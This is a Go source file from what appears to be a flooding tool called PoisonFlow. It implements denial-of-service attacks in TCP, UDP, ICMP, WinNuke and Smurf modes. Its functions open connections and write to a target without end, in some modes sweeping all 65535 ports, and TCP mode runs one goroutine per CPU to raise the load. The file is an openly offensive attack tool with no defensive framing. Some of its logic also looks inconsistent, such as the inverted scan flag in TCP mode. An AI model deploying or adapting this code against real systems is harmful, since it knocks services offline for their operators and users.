// Package service  -----------------------------
// @file      : ddos.go
// @author    : fzf
// @time      : 2023/5/9 上午10:28
// -------------------------------------------
package service

import (
	"PoisonFlow/src/conf"
	"PoisonFlow/src/utils"
	"fmt"
	logger "github.com/sirupsen/logrus"
	"net"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"
)

type DDOSInterface interface {
	Execute(config *conf.FlowModel)
	SendPacket(mode, address string)
	ScanPacket(mode, address string)
	ICMP(config *conf.FlowModel)
	TCP(config *conf.FlowModel)
	UDP(config *conf.FlowModel)
}

type DdosAPP struct {
}

func (p *DdosAPP) Execute(config *conf.FlowModel) {
	switch config.Mode {
	case "TCP":
		p.TCP(config)
	case "UDP":
		p.UDP(config)
	case "ICMP":
		p.ICMP(config)
	case "WinNuke":
		config.Port = 139
		p.TCP(config)
	case "Smurf":
		if strings.HasSuffix(config.Host, "255") {
			p.ICMP(config)
		} else {
			logger.Errorf("Please check format of Smurf host : 192.168.255.255")
		}
	default:
		utils.Check.CheckExit("Please check format of ddos mode : TCP、UDP、ICMP、WinNuke、Smurf")
	}
}

func (p *DdosAPP) ICMP(config *conf.FlowModel) {
	if config.Scan == 0 {
		p.SendPacket("ip4:icmp", config.Host)
	} else {
		p.ScanPacket("ip4:icmp", config.Host)
	}
}

func (p *DdosAPP) UDP(config *conf.FlowModel) {
	if config.Scan == 0 {
		var host = fmt.Sprintf("%s:%d", config.Host, config.Port)
		p.SendPacket("udp", host)
	} else {
		p.ScanPacket("udp", config.Host)
	}
}

func (p *DdosAPP) TCP(config *conf.FlowModel) {
	numCPU := runtime.NumCPU()
	logger.Printf("Limit Send mode---CPU：%d", numCPU)
	var host = fmt.Sprintf("%s:%d", config.Host, config.Port)
	if config.Scan == 0 {
		for i := 0; i < numCPU; i++ {
			go p.ScanPacket("tcp", config.Host)
		}
	} else {
		for i := 0; i < numCPU; i++ {
			go p.SendPacket("tcp", host)
		}
	}
	result := fmt.Sprintf("stopped sending a total of %d packets", TotalPacket)
	fmt.Scanln(&result)
}

func (p *DdosAPP) SendPacket(mode, address string) {
	// 捕获ctrl+c
	signal.Notify(Signal, syscall.SIGINT, syscall.SIGTERM)
	// 发送数据包
	for {
		select {
		// 捕获ctrl + c
		case _ = <-Signal:
			logger.Printf("stopped sending a total of %d packets", TotalPacket)
			os.Exit(0)
		default:
			conn, err := net.DialTimeout(mode, address, time.Millisecond*300)
			TemporaryPacket += 1
			if err != nil {
				break
			}
			_, err = conn.Write([]byte(address))
			if err != nil {
				break
			}

		}
	}
}
func (p *DdosAPP) ScanPacket(mode, host string) {
	// 捕获ctrl+c
	signal.Notify(Signal, syscall.SIGINT, syscall.SIGTERM)
	// 发送数据包
	for {
		select {
		// 捕获ctrl + c
		case _ = <-Signal:
			logger.Printf("stopped sending a total of %d packets", TotalPacket)
			os.Exit(0)
		default:
			for range make([]struct{}, 65535) {
				ScanPort += 1
				var address = fmt.Sprintf("%s:%d", host, ScanPort)
				conn, err := net.DialTimeout(mode, address, time.Millisecond*300)
				TemporaryPacket += 1
				if err != nil {
					break
				}
				_, err = conn.Write([]byte(address))
				if err != nil {
					break
				}
			}
			ScanPort = 0
		}
	}
}
